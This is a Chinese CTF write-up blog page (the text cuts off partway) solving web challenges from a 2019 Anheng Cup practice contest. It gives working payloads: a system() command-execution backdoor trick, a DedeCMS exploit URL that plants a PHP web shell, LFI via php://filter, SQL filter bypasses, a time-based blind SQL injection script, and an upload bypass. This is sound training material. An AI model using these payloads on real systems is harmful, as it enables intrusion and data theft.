@@ -1,0 +1,737 @@
+
+ <!DOCTYPE HTML>
+<html lang="cn-zh">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>2019安恒杯Web安全测试大赛练习赛Writeup | GetFlag&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="GetFlag">
+    
+
+    
+    <meta name="description" content="全是Web题，虽然大都是原题，但是质量不错，刷完后感觉学到了不少知识。">
+<meta name="keywords" content="安恒杯Web安全测试大赛">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019安恒杯Web安全测试大赛练习赛Writeup">
+<meta property="og:url" content="http://flag0.com/2019/09/27/2019安恒杯Web安全测试大赛练习赛Writeup/index.html">
+<meta property="og:site_name" content="GetFlag&#39;s Blog">
+<meta property="og:description" content="全是Web题，虽然大都是原题，但是质量不错，刷完后感觉学到了不少知识。">
+<meta property="og:locale" content="cn-zh">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569595787704.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569165402859.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569326445947.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569330050134.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569330251722.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569330321021.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569594314883.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569594518980.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569594566506.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569594128673.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569593877564.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569593465305.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569592989615.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569593070099.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569590980040.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569591287954.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569593101648.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569590806621.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569589959820.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569586043107.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569586575730.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569586616551.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569586798936.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569586832636.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569586981298.png">
+<meta property="og:image" content="http://flag0.com/img/images/Writeup/1569589283882.png">
+<meta property="og:updated_time" content="2019-09-27T15:04:47.319Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019安恒杯Web安全测试大赛练习赛Writeup">
+<meta name="twitter:description" content="全是Web题，虽然大都是原题，但是质量不错，刷完后感觉学到了不少知识。">
+<meta name="twitter:image" content="http://flag0.com/img/images/Writeup/1569595787704.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="GetFlag&#39;s Blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="GetFlag&#39;s Blog">GetFlag&#39;s Blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:flag0.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/09/27/2019安恒杯Web安全测试大赛练习赛Writeup/" title="2019安恒杯Web安全测试大赛练习赛Writeup" itemprop="url">2019安恒杯Web安全测试大赛练习赛Writeup</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
+		
+  <p class="article-time">
+    <time datetime="2019-09-27T15:04:44.000Z" itemprop="datePublished"> Published 2019-09-27</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#爱い窒息、痛"><span class="toc-number">1.</span> <span class="toc-text">爱い窒息、痛</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dedecms"><span class="toc-number">2.</span> <span class="toc-text">dedecms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#新的新闻搜索"><span class="toc-number">3.</span> <span class="toc-text">新的新闻搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常规操作"><span class="toc-number">4.</span> <span class="toc-text">常规操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#新闻搜索"><span class="toc-number">5.</span> <span class="toc-text">新闻搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一个hackerone的有趣的漏洞的复现"><span class="toc-number">6.</span> <span class="toc-text">一个hackerone的有趣的漏洞的复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#奇怪的恐龙特性"><span class="toc-number">7.</span> <span class="toc-text">奇怪的恐龙特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#新瓶装旧酒"><span class="toc-number">8.</span> <span class="toc-text">新瓶装旧酒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleepcms"><span class="toc-number">9.</span> <span class="toc-text">sleepcms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5"><span class="toc-number">10.</span> <span class="toc-text">md5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的md5"><span class="toc-number">11.</span> <span class="toc-text">简单的md5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#秘密的系统"><span class="toc-number">12.</span> <span class="toc-text">秘密的系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#game"><span class="toc-number">13.</span> <span class="toc-text">game</span></a></li></ol>
+		
+		</div>
+		
+		<p>全是Web题，虽然大都是原题，但是质量不错，刷完后感觉学到了不少知识。</p>
+<a id="more"></a>
+<h3 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h3><blockquote>
+<p>非主流老哥的后门，你进得去么,靶机：<a href="http://114.55.36.69:8020" target="_blank" rel="noopener">http://114.55.36.69:8020</a></p>
+</blockquote>
+<p>这道题的考点在于</p>
+<ul>
+<li>检测ua头中有没有传入值的md5加密后的字符串</li>
+<li>绕过字符串切分，成功拼接url</li>
+<li>利用<code>$f($d)</code>类型的一句话木马</li>
+</ul>
+<p>访问<code>http://114.55.36.69:8020/upload/dama.xxxx</code>得到源码</p>
+<p>php格式化后<code>http://www.jsons.cn/phpformat/</code>，进行审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="comment">//</span></span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到最开始，如果当参数<code>pass</code>不为空的时候，调用<code>chkpass</code>函数进行判断</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;<span class="comment">//stripos查找字符串首次出现的位置（不区分大小写）</span></span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而<code>chkpass</code>则是检测，<code>user_agent</code>头里有没有，md5加密过的<code>pass</code>参数的值</p>
+<p>向下接着看<code>helloowner</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;<span class="comment">//字符串拼接函数</span></span><br><span class="line">    $b = gencodeurl($a);<span class="comment">//如果长度&gt;40,则进行截取拼接,如果&lt;40返回的url为http://goodweb.com</span></span><br><span class="line">    $c = file_get_contents($b);<span class="comment">//读取给定网址的文件内容</span></span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);<span class="comment">//将读取到的内容进行json_decode 解码,以数组形式返回?</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;<span class="comment">//如果$d['f']未获取到,则输出fail3</span></span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d[<span class="string">'f'</span>](\img\images\$d[<span class="string">'d'</span>]);</span><br><span class="line">    <span class="comment">//否则的话，将拼接函数执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;<span class="comment">//url切分</span></span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;<span class="comment">//如果长度&gt;40,$f = a[30:35],$g = a[10:20]</span></span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>helloowner</code>则是进行url切分拼接，和json_decode后执行<code>$d[&#39;f&#39;](\img\images\$d[&#39;d&#39;]);</code></p>
+<p>这里可以把url切分函数，单独分离出来，搭在到本地进行测试</p>
+<p><img src="\img\images\Writeup\1569595787704.png" alt="1569595787704"></p>
+<p>成功绕过。</p>
+<p>而<code>$d[&#39;f&#39;](\img\images\$d[&#39;d&#39;]);</code>可以用于构造命令执行的一句话木马(这里构造代码执行eval一句话失败，无法被执行)</p>
+<p>这里构造paload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = <span class="keyword">array</span>( </span><br><span class="line">    <span class="string">"f"</span>=&gt;<span class="string">"system"</span>, </span><br><span class="line">    <span class="string">"d"</span>=&gt;<span class="string">"cat ../flag.php"</span> </span><br><span class="line">); </span><br><span class="line">$url = json_encode($url); </span><br><span class="line"><span class="keyword">echo</span> $url; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>最终访问输出如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;f&quot;:&quot;system&quot;,&quot;d&quot;:&quot;cat ..\/flag.php&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>构造并发送payload，获得flag</p>
+<p><img src="\img\images\Writeup\1569165402859.png" alt="1569165402859"></p>
+<h3 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h3><blockquote>
+<p>放出来好几天的东西，随便玩玩<code>http://114.55.36.69:8008</code></p>
+</blockquote>
+<p>默认后台，后台管理员登陆页面弱口令<code>admin/admin</code></p>
+<p>发现dedecms版本为<strong>DedeCMS_V57_UTF8_SP2</strong>，在网上可以找到它的后台代码执行漏洞，<code>https://www.freebuf.com/vuls/164035.html</code></p>
+<p>访问<code>http://114.55.36.69:8008/dede/tpl.php?action=upload</code>，右击查看源代码获取token值</p>
+<p><img src="\img\images\Writeup\1569326445947.png" alt="1569326445947"></p>
+<p>写入一句话木马</p>
+<p><code>http://114.55.36.69:8008/dede/tpl.php?filename=flag0.lib.php&amp;action=savetagfile&amp;content=%3C?php%20system($_POST[%27cmd%27]);%20?%3E&amp;token=89f28c36f44cd0849bc2c43880b5dd18</code></p>
+<p><img src="\img\images\Writeup\1569330050134.png" alt="1569330050134"></p>
+<p>访问写入的木马获取到flag路径</p>
+<p><img src="\img\images\Writeup\1569330251722.png" alt="1569330251722"></p>
+<p>getflag</p>
+<p><img src="\img\images\Writeup\1569330321021.png" alt="1569330321021"></p>
+<h3 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h3><blockquote>
+<p>你以为还是简单的新闻搜索网站么 <a href="http://114.55.36.69:8030" target="_blank" rel="noopener">http://114.55.36.69:8030</a></p>
+</blockquote>
+<p>这里过滤了<code>union</code>、<code>select</code>使用mysql内联注释进行绕过</p>
+<p><img src="\img\images\Writeup\1569594314883.png" alt="1569594314883"></p>
+<h3 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h3><blockquote>
+<p>常规操作，试一试 <a href="http://114.55.36.69:8009/" target="_blank" rel="noopener">http://114.55.36.69:8009/</a></p>
+</blockquote>
+<p>这里存在本地文件包含，且php拼接后缀</p>
+<p>发现其web根目录下存在<code>flag.php</code>，直接php伪协议读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.55.36.69:8009/index.php?url=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\Writeup\1569594518980.png" alt="1569594518980"></p>
+<p>base64解码即可得到flag</p>
+<p><img src="\img\images\Writeup\1569594566506.png" alt="1569594566506"></p>
+<h3 id="新闻搜索"><a href="#新闻搜索" class="headerlink" title="新闻搜索"></a>新闻搜索</h3><blockquote>
+<p>简单的新闻搜索网站 <a href="http://114.55.36.69:8010" target="_blank" rel="noopener">http://114.55.36.69:8010</a></p>
+</blockquote>
+<p>简单的post注入</p>
+<p><img src="\img\images\Writeup\1569594128673.png" alt="1569594128673"></p>
+<h3 id="一个hackerone的有趣的漏洞的复现"><a href="#一个hackerone的有趣的漏洞的复现" class="headerlink" title="一个hackerone的有趣的漏洞的复现"></a>一个hackerone的有趣的漏洞的复现</h3><blockquote>
+<p>ctf打多了，现在咱们把hackerone的漏洞复现一下吧。小曾师傅花了好几天写了一套模拟hackerone上的漏洞的程序，恩阿。很有趣哦~这可是企业实实在在遇到的问题哦！不是脑洞大开题 请各位亲们谨慎思考。靶机：<a href="http://114.55.36.69:8023" target="_blank" rel="noopener">http://114.55.36.69:8023</a></p>
+</blockquote>
+<ul>
+<li>注册用户绑定自己邮箱</li>
+<li>获取校验链接  </li>
+<li>请求校验链接</li>
+<li>在请求校验链接的同时，修改绑定邮箱为管理员邮箱如果能够在代码执行“校验成功”和“更新账户绑定邮箱状 态”步骤之间成功修改邮箱，就能直接将邮箱状态设置为已校验(条件竞争/时间竞争)</li>
+</ul>
+<p><a href="\img\images\http://flag0.com/2019/09/27/%E4%B8%80%E4%B8%AAhackerone%E7%9A%84%E6%9C%89%E8%B6%A3%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%A4%8D%E7%8E%B0Writeup/">详细步骤</a></p>
+<h3 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h3><blockquote>
+<p>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。靶机：<a href="http://114.55.36.69:8022" target="_blank" rel="noopener">http://114.55.36.69:8022</a></p>
+</blockquote>
+<p>这是一道代码审计题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>会获取到所有的文件后面传递的所有参数。</p>
+<p>下面的实验可以直观的展现出它的作用</p>
+<p><img src="\img\images\Writeup\1569593877564.png" alt="1569593877564"></p>
+<p>php有以下特性</p>
+<ul>
+<li>php自身在解析请求时，会把+和.解析成下划线</li>
+<li>数组与数字比较，永远大于数字</li>
+<li>字符a在和整形进行弱类型比较时，会被强制转换成整形，其值为0</li>
+</ul>
+<p>利用以上特性进行绕过</p>
+<p><img src="\img\images\Writeup\1569593465305.png" alt="1569593465305"></p>
+<h3 id="新瓶装旧酒"><a href="#新瓶装旧酒" class="headerlink" title="新瓶装旧酒"></a>新瓶装旧酒</h3><blockquote>
+<p>瓶子里的酒啊，越久越好,靶机：<a href="http://114.55.36.69:8017" target="_blank" rel="noopener">http://114.55.36.69:8017</a></p>
+</blockquote>
+<p>作为一个不会代码审计的弱鸡，看了两个小时代码，猜测可能在上传解压后判断文件名不合法然后删除文件的地方存在条件竞争</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($files <span class="keyword">as</span> $name)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!in_array(getExt($name), <span class="keyword">array</span>(<span class="string">'.jpg'</span>,<span class="string">'.png'</span>,<span class="string">'.jpeg'</span>,<span class="string">'.gif'</span>)) || strpos($name, <span class="string">'.ph'</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">        unlink($tmpdir.<span class="string">'/'</span>.$name);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     $files_num++;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"/upload/"</span>.md5($tmpname).<span class="string">"/&#123;$name&#125;\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果发现每次上传的时候都会有几秒的sleep时间，并不能成功竞争，并且如果爆破的话，会导致web无法正常访问。</p>
+<p>最后发现是考点是apache2.2.15的解析漏洞，跟代码怎么写没有关系。。。</p>
+<p>在apache2.2.15版本的情况下，<code>test.php.png</code>及<code>.jpg</code>、<code>.gif</code>等均会被解析成php文件来执行，高版本的apach服务器不存在此漏洞。</p>
+<p>尝试上传压缩包中名字为<code>test.php.png</code>的一句话木马时无法上传成功，判断可能黑名单检测php，这里我们上传文件名<code>test.PHP.png</code>为的一句话木马。</p>
+<p><img src="\img\images\Writeup\1569592989615.png" alt="1569592989615"></p>
+<p>上传成功，得到flag</p>
+<p><img src="\img\images\Writeup\1569593070099.png" alt="1569593070099"></p>
+<h3 id="sleepcms"><a href="#sleepcms" class="headerlink" title="sleepcms"></a>sleepcms</h3><blockquote>
+<p>要学习新的内容才能做出来 <a href="http://114.55.36.69:8007" target="_blank" rel="noopener">http://114.55.36.69:8007</a></p>
+</blockquote>
+<p>访问<code>http://114.55.36.69:8007/robots.txt</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`article`</span> (<span class="string">`id`</span>, <span class="string">`title`</span>, <span class="string">`view_times`</span>,<span class="string">`content`</span>) <span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>, <span class="string">'admin\' flag'</span>,<span class="number">0</span>, <span class="string">'xxxxxxxxxxxxxxxxxxxxxxx'</span>),</span><br><span class="line">(<span class="number">2</span>, <span class="string">'hello guest'</span>,<span class="number">0</span>, <span class="string">'hello guest,you want is not here~~'</span>),</span><br><span class="line">(<span class="number">3</span>, <span class="string">'some hint'</span>,<span class="number">0</span>, <span class="string">'long or short?\r\nsleep and injection!'</span>);</span><br></pre></td></tr></table></figure>
+<p>从题目名称和robots.txt文件可以猜测，该题目考察的是基于时间的盲注</p>
+<p>发现此处存在黑名单</p>
+<p><img src="\img\images\Writeup\1569590980040.png" alt="1569590980040"></p>
+<p>经过测试发现其检测<code>sleep</code>、<code>benchmark</code>函数，这里我们可以利用等价函数<code>get_lock()</code>来进行延时注入</p>
+<p>参考资料<code>https://www.cesafe.com/3993.html</code></p>
+<p>可以注入出数据库名</p>
+<p><img src="\img\images\Writeup\1569591287954.png" alt="1569591287954"></p>
+<p>但是向下不得不使用<code>select</code>语句进行注入，这道题同样检测<code>select</code></p>
+<p>此时可以不使用传统的<code>数据库名=&gt;表名=&gt;字段名=&gt;数据</code>的方式来进行注入，可以利用mysql 同库不需要select查表，直接可以查询字段名的特性来进行构造sql注入语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and if(ascii(substr((content),1,1))&gt;1,get_lock(&apos;test&apos;,3),1)%23</span><br></pre></td></tr></table></figure>
+<p>此时要注意使用<code>get_lock</code>函数时需要开两个session测试，第二次测试才会有正常的延时。</p>
+<p>根据语句写出盲注脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">data = <span class="string">''</span></span><br><span class="line">url = <span class="string">"http://114.55.36.69:8007/article.php?id=1'"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">47</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        url_req = url + <span class="string">" and if(ascii(substr((content),&#123;0&#125;,1))=&#123;1&#125;,get_lock('test',3),1)%23"</span>.format(i+<span class="number">1</span>,str(c))</span><br><span class="line">        print(url_req)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        res = requests.get(url_req)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> (end_time - start_time) &gt; <span class="number">2.5</span>:</span><br><span class="line">            data += chr(c)</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">print(<span class="string">'data:'</span>,data)</span><br></pre></td></tr></table></figure>
+<p>运行得到flag</p>
+<p><img src="\img\images\Writeup\1569593101648.png" alt="1569593101648"></p>
+<h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><blockquote>
+<p>md5 crash <a href="http://114.55.36.69:8006" target="_blank" rel="noopener">http://114.55.36.69:8006</a></p>
+</blockquote>
+<p>右击查看源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5 cracking&lt;!-- if((string)$_POST[&apos;data1&apos;]!==(string)$_POST[&apos;data2&apos;]&amp;&amp;md5($_POST[&apos;data1&apos;])===md5($_POST[&apos;data2&apos;]))--&gt;fail</span><br></pre></td></tr></table></figure>
+<p>发现进行了类型转换，并且使强类型比较，可以使用md5碰撞生成器，生成两个内容不同，但是md5相同的问题件，来进行攻击</p>
+<p>使用fastcoll工具来进行md5碰撞攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p .\a.bin -o a1.bin a2.bin</span><br></pre></td></tr></table></figure>
+<p>用python来进行读取然后进行url编码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">f1 = open(<span class="string">"a1.bin"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">f2 = open(<span class="string">"a2.bin"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'data1'</span>:f1,</span><br><span class="line">    <span class="string">'data2'</span>:f2,</span><br><span class="line">    &#125;</span><br><span class="line">flag = requests.post(<span class="string">"http://114.55.36.69:8006"</span>,data=data).text</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p><img src="\img\images\Writeup\1569590806621.png" alt="1569590806621"></p>
+<h3 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h3><blockquote>
